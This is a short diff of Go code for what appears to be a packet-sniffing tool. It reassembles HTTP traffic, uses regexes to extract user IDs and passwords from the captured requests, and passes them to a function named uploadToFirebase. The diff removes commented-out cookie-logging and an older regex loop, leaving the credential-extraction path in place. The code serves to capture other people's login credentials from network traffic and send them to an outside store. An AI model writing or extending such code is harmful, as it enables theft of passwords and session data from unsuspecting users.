@@ -63,11 +63,6 @@ func (h *httpStreamFactory) New(a, _ gopacket.Flow) tcpassembly.Stream {
 						PW,
 					})
 				}
-				// cookies := req.Cookies()
-				// if len(cookies) > 0 {
-				// 	referer := req.Header.Get("Referer")
-				// 	log.Println(referer, ":", cookies)
-				// }
 			}
 		}
 	}()
@@ -83,15 +78,6 @@ func uploadToFirebase(row *Row) {
 }
 
 func find(http []byte) []string {
-	// for url, re := range reMap {
-	// 	parsed := re.FindSubmatch(http)
-	// 	if len(parsed) != 3 {
-	// 		continue
-	// 	}
-	// 	return []string{url, string(parsed[1]), string(parsed[2])}
-	// }
-	// return nil
-
 	id := reID.FindSubmatch(http)
 	pw := rePW.FindSubmatch(http)
 	if len(id) == 2 && len(pw) == 2 {
